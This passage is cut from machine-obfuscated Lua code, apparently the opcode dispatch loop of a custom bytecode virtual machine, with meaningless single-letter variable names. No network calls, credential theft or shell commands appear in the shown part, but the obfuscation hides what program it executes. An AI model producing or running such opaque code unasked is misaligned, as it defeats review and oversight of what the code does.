ba;w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](w[ba+1])else local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](w[ba+1])end;elseif 224>=z then if 218>=z then if(215==z or 215>z)then if(213==z or 213>z)then local ba=0 while true do if ba<=6 then if ba<=2 then if ba<=0 then w[y[514]]=w[y[14]][y[463]];else if ba==1 then n=n+1;else y=f[n];end end else if ba<=4 then if ba<4 then w[y[514]]=w[y[14]][y[463]];else n=n+1;end else if 6~=ba then y=f[n];else w[y[514]]=w[y[14]][y[463]];end end end else if ba<=9 then if ba<=7 then n=n+1;else if ba==8 then y=f[n];else w[y[514]]=w[y[14]][y[463]];end end else if ba<=11 then if ba==10 then n=n+1;else y=f[n];end else if ba~=13 then if w[y[514]]then n=n+1;else n=y[14];end;else break end end end end ba=ba+1 end elseif(z~=215)then local ba=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba~=1 then w[y[514]]=w[y[14]][y[463]];else n=n+1;end else if ba<3 then y=f[n];else w[y[514]][y[14]]=w[y[463]];end end else if ba<=5 then if ba~=5 then n=n+1;else y=f[n];end else if ba<7 then w[y[514]]=h[y[14]];else n=n+1;end end end else if ba<=11 then if ba<=9 then if ba~=9 then y=f[n];else w[y[514]]=w[y[14]][y[463]];end else if 10==ba then n=n+1;else y=f[n];end end else if ba<=13 then if 13~=ba then w[y[514]][y[14]]=w[y[463]];else n=n+1;end else if ba<=14 then y=f[n];else if 16~=ba then do return w[y[514]]end else break end end end end end ba=ba+1 end else local ba=y[514]local bb={}for bc=1,#v do local bd=v[bc]for be=1,#bd do local bd=bd[be]local be,be=bd[1],bd[2]if(be>ba or be==ba)then bb[be]=w[be]bd[1]=bb v[bc]=nil;end end end end;elseif(z==216 or z<216)then w[y[514]]=w[y[14]]*y[463];elseif(z~=218)then w[y[514]]=#w[y[14]];else local ba=0 while true do if ba<=6 then if ba<=2 then if ba<=0 then w[y[514]]=w[y[14]][y[463]];else if 2>ba then n=n+1;else y=f[n];end end else if ba<=4 then if ba==3 then w[y[514]]=w[y[14]][y[463]];else n=n+1;end else if ba<6 then y=f[n];else w[y[514]]=w[y[14]][y[463]];end end end else if ba<=9 then if ba<=7 then n=n+1;else if ba<9 then y=f[n];else w[y[514]]=w[y[14]][y[463]];end end else if ba<=11 then if ba>10 then y=f[n];else n=n+1;end else if ba<13 then if w[y[514]]then n=n+1;else n=y[14];end;else break end end end end ba=ba+1 end end;elseif 221>=z then if z<=219 then local ba=y[514];local bb=w[ba];for bc=ba+1,p do t(bb,w[bc])end;elseif 220==z then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[514]]=false;n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];for bb=y[514],y[14],1 do w[bb]=nil;end;n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](w[ba+1])else do return w[y[514]]end end;elseif 222>=z then if(w[y[514]]~=y[463])then n=n+1;else n=y[14];end;elseif 224>z then h[y[14]]=w[y[514]];else local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end end;elseif 230>=z then if z<=227 then if z<=225 then local ba=y[514];local bb=w[ba];for bc=ba+1,y[14]do t(bb,w[bc])end;elseif z<227 then local ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))else if(y[514]<=w[y[463]])then n=n+1;else n=y[14];end;end;elseif z<=228 then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];if(w[y[514]]~=y[463])then n=n+1;else n=y[14];end;elseif 230~=z then if(w[y[514]]<w[y[463]])then n=n+1;else n=y[14];end;else n=y[14];end;elseif 233>=z then if z<=231 then local ba;w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))elseif 233~=z then if(w[y[514]]~=w[y[463]])then n=y[14];else n=n+1;end;else w[y[514]][y[14]]=y[463];end;elseif 234>=z then w[y[514]]=(w[y[14]]+w[y[463]]);elseif z>235 then w[y[514]]=false;n=n+1;else local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end end;elseif 260>=z then if 248>=z then if 242>=z then if 239>=z then if 237>=z then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=#w[y[14]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514];w[ba]=w[ba]-w[ba+2];n=y[14];elseif z<239 then local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=false;n=n+1;y=f[n];ba=y[514]w[ba](w[ba+1])else local ba;w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](w[ba+1])end;elseif 240>=z then w[y[514]]=(w[y[14]]%y[463]);elseif 241<z then local ba;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))else local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](w[ba+1])end;elseif 245>=z then if z<=243 then local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end elseif 244<z then if(w[y[514]]~=w[y[463]])then n=n+1;else n=y[14];end;else w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;end;elseif z<=246 then local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]]*y[463];n=n+1;y=f[n];w[y[514]]=w[y[14]]+w[y[463]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]]+w[y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))elseif z>247 then local ba;w[y[514]]={};n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba]()else local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=254 then if 251>=z then if 249>=z then local ba,bb,bc,bd=0 while true do if ba<=15 then if ba<=7 then if ba<=3 then if ba<=1 then if ba<1 then bb=nil else bc=nil end else if 3>ba then bd=nil else w[y[514]]=h[y[14]];end end else if ba<=5 then if 5>ba then n=n+1;else y=f[n];end else if ba~=7 then w[y[514]]=w[y[14]][y[463]];else n=n+1;end end end else if ba<=11 then if ba<=9 then if 9>ba then y=f[n];else w[y[514]]=h[y[14]];end else if 10<ba then y=f[n];else n=n+1;end end else if ba<=13 then if ba>12 then n=n+1;else w[y[514]]=w[y[14]][y[463]];end else if ba==14 then y=f[n];else w[y[514]]=w[y[14]][w[y[463]]];end end end end else if ba<=23 then if ba<=19 then if ba<=17 then if ba~=17 then n=n+1;else y=f[n];end else if 18==ba then w[y[514]]=h[y[14]];else n=n+1;end end else if ba<=21 then if ba~=21 then y=f[n];else w[y[514]]=w[y[14]][y[463]];end else if 22==ba then n=n+1;else y=f[n];end end end else if ba<=27 then if ba<=25 then if 25>ba then w[y[514]]=w[y[14]][y[463]];else n=n+1;end else if ba==26 then y=f[n];else bd=y[14];end end else if ba<=29 then if 28<ba then bb=k(w,g,bd,bc);else bc=y[463];end else if 31>ba then w[y[514]]=bb;else break end end end end end ba=ba+1 end elseif 250<z then w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];if(w[y[514]]~=y[463])then n=n+1;else n=y[14];end;else local ba;w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))end;elseif 252>=z then local ba,bb,bc,bd=0 while true do if(ba<=9)then if(ba==4 or ba<4)then if ba<=1 then if ba>0 then bc=nil else bb=nil end else if(ba<2 or ba==2)then bd=nil else if ba>3 then n=n+1;else w[y[514]]=h[y[14]];end end end else if(ba<6 or ba==6)then if ba<6 then y=f[n];else w[y[514]]=w[y[14]][y[463]];end else if ba<=7 then n=n+1;else if 8<ba then w[y[514]]=w[y[14]][y[463]];else y=f[n];end end end end else if(ba<14 or ba==14)then if(ba<=11)then if 10<ba then y=f[n];else n=n+1;end else if(ba==12 or ba<12)then w[y[514]]=w[y[14]][y[463]];else if not(ba~=13)then n=(n+1);else y=f[n];end end end else if(ba<=16)then if(ba>15)then bc={w[bd](w[bd+1])};else bd=y[514]end else if(ba<=17)then bb=0;else if(ba==18)then for be=bd,y[463]do bb=(bb+1);w[be]=bc[bb];end else break end end end end end ba=(ba+1)end elseif 254~=z then local ba=w[y[514]]+y[463];w[y[514]]=ba;if(ba<=w[y[514]+1])then n=y[14];end;else w[y[514]]=#w[y[14]];end;elseif 257>=z then if z<=255 then w[y[514]]=j[y[14]];elseif z<257 then local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba]()else local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))end;elseif z<=258 then local ba,bb=0 while true do if ba<=16 then if ba<=7 then if ba<=3 then if ba<=1 then if ba~=1 then bb=nil else w[y[514]]=w[y[14]][y[463]];end else if ba==2 then n=n+1;else y=f[n];end end else if ba<=5 then if 5>ba then w[y[514]]=h[y[14]];else n=n+1;end else if ba<7 then y=f[n];else w[y[514]]=w[y[14]][y[463]];end end end else if ba<=11 then if ba<=9 then if ba<9 then n=n+1;else y=f[n];end else if ba<11 then w[y[514]]={};else n=n+1;end end else if ba<=13 then if 13~=ba then y=f[n];else w[y[514]]=h[y[14]];end else if ba<=14 then n=n+1;else if 16>ba then y=f[n];else w[y[514]]=w[y[14]][y[463]];end end end end end else if ba<=24 then if ba<=20 then if ba<=18 then if 18~=ba then n=n+1;else y=f[n];end else if ba~=20 then w[y[514]]=h[y[14]];else n=n+1;end end else if ba<=22 then if 21<ba then w[y[514]]={};else y=f[n];end else if 23==ba then n=n+1;else y=f[n];end end end else if ba<=28 then if ba<=26 then if 26>ba then w[y[514]]=h[y[14]];else n=n+1;end else if 28~=ba then y=f[n];else w[y[514]]=w[y[14]][y[463]];end end else if ba<=30 then if ba<30 then n=n+1;else y=f[n];end else if ba<=31 then bb=y[514]else if ba~=33 then w[bb]=w[bb]()else break end end end end end end ba=ba+1 end elseif 259<z then local ba=d[y[14]];local bb={};local bc={};for bd=1,y[463]do n=n+1;local be=f[n];if be[70]==290 then bc[bd-1]={w,be[14]};else bc[bd-1]={h,be[14]};end;v[#v+1]=bc;end;m(bb,{['\95\95\105\110\100\101\120']=function(m,m)local m=bc[m];return m[1][m[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(m,m,v)local m=bc[m]m[1][m[2]]=v;end;});w[y[514]]=b(ba,bb,j);else w[y[514]]=h[y[14]];end;elseif 272>=z then if z<=266 then if z<=263 then if z<=261 then local m=y[514]w[m](r(w,m+1,y[14]))elseif z<263 then if(w[y[514]]<=w[y[463]])then n=y[14];else n=n+1;end;else local m=y[514]w[m]=w[m](r(w,m+1,p))end;elseif 264>=z then local m;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];m=y[514]w[m]=w[m](r(w,m+1,y[14]))elseif z~=266 then w[y[514]]=y[14]*w[y[463]];else local m;w={};for v=0,u,1 do if v<o then w[v]=s[v+1];else break;end;end;n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];m=y[514]w[m]=w[m](w[m+1])end;elseif z<=269 then if 267>=z then local m=y[514]w[m](r(w,m+1,p))elseif z>268 then local m;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];m=y[514]w[m]=w[m](r(w,m+1,y[14]))else local m=y[514];local v,ba,bb=w[m],w[m+1],w[m+2];local v=v+bb;w[m]=v;if bb>0 and v<=ba or bb<0 and v>=ba then n=y[14];w[m+3]=v;end;end;elseif z<=270 then local m;local v;local ba;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];ba=y[514]v={w[ba](w[ba+1])};m=0;for bb=ba,y[463]do m=m+1;w[bb]=v[m];end elseif z>271 then local m;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];m=y[514]w[m]=w[m](r(w,m+1,y[14]))else local m;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];m=y[514]w[m]=w[m](r(w,m+1,y[14]))end;elseif 278>=z then if z<=275 then if 273>=z then if(w[y[514]]~=y[463])then n=y[14];else n=(n+1);end;elseif z~=275 then local m;w[y[514]]={};n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];m=y[514]w[m](r(w,m+1,y[14]))else local m;local v;local ba;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];ba=y[514]v={w[ba](w[ba+1])};m=0;for bb=ba,y[463]do m=m+1;w[bb]=v[m];end end;elseif z<=276 then local m;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=false;n=n+1;y=f[n];m=y[514]w[m](w[m+1])elseif z>277 then local m;w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];m=y[514]w[m]=w[m](w[m+1])else w[y[514]][y[14]]=y[463];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];end;elseif 281>=z then if z<=279 then local m=y[514];local v=y[463];local ba=m+2;local bb={w[m](w[m+1],w[ba])};for bc=1,v do w[ba+bc]=bb[bc];end local m=w[m+3];if m then w[ba]=m;n=y[14];else n=n+1 end;elseif z>280 then local m;local v;local ba;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];ba=y[514]v={w[ba](w[ba+1])};m=0;for bb=ba,y[463]do m=m+1;w[bb]=v[m];end else if(w[y[514]]<=w[y[463]])then n=y[14];else n=n+1;end;end;elseif z<=282 then w[y[514]]=y[14]*w[y[463]];elseif z>283 then w[y[514]]=w[y[14]]/y[463];else local m;w[y[514]]={};n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];m=y[514]w[m]=w[m]()end;elseif z<=331 then if 307>=z then if 295>=z then if z<=289 then if z<=286 then if 286~=z then if(w[y[514]]~=w[y[463]])then n=n+1;else n=y[14];end;else local m;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];m=y[514]w[m]=w[m](w[m+1])end;elseif z<=287 then w[y[514]]={};elseif z==288 then local m;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];m=y[514]w[m]=w[m](r(w,m+1,y[14]))else w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];if(w[y[514]]~=w[y[463]])then n=n+1;else n=y[14];end;end;elseif 292>=z then if 290>=z then w[y[514]]=w[y[14]];elseif 291==z then local m;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];m=y[514]w[m]=w[m](r(w,m+1,y[14]))else w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];if(w[y[514]]~=y[463])then n=n+1;else n=y[14];end;end;elseif z<=293 then local m,v=0 while true do if m<=7 then if m<=3 then if m<=1 then if m<1 then v=nil else w[y[514]][y[14]]=w[y[463]];end else if 3>m then n=n+1;else y=f[n];end end else if m<=5 then if 4==m then w[y[514]]={};else n=n+1;end else if 6==m then y=f[n];else w[y[514]][y[14]]=y[463];end end end else if m<=11 then if m<=9 then if 9>m then n=n+1;else y=f[n];end else if m~=11 then w[y[514]][y[14]]=w[y[463]];else n=n+1;end end else if m<=13 then if 13>m then y=f[n];else v=y[514]end else if m>14 then break else w[v]=w[v](r(w,v+1,y[14]))end end end end m=m+1 end elseif z<295 then do return end;else w[y[514]]=w[y[14]][w[y[463]]];end;elseif z<=301 then if 298>=z then if z<=296 then w[y[514]][y[14]]=w[y[463]];elseif z>297 then local m=w[y[463]];if m then n=n+1;else w[y[514]]=m;n=y[14];end;else local m=y[514];local v=w[y[14]];w[m+1]=v;w[m]=v[y[463]];end;elseif z<=299 then local m;w[y[514]]={};n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];m=y[514]w[m]=w[m]()elseif z>300 then w[y[514]]=true;else h[y[14]]=w[y[514]];end;elseif 304>=z then if z<=302 then local m;local 